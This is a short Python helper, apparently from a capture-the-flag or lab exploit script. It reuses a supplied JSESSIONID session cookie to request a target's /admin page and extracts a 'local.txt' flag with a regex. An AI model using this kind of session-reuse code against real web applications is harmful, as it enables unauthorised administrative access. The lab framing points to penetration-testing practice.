import requests
import re 
from urllib.parse import urljoin

def fetchAdminFlag(target, session):
    url = urljoin(target, "/admin") # admin endpoint 
    cookies = {"JSESSIONID": session} # session cookie 
    try:
        res = requests.get(url, cookies=cookies)
        try: 
            localFlag = re.search(r"<code>(|\n+)(.*.)(|\n+)<\/code>", res.text).group(2)
            print(f"[+] local.txt flag: {localFlag}")
        except Exception as e:
            print("[-] Error extracting or didn't fing the local falg in the response: ", e)
            print("[*] Response: ", res.text)
    except Exception as e:
        print("[-] Error sending the fetch local.txt flag request: ", e)

  
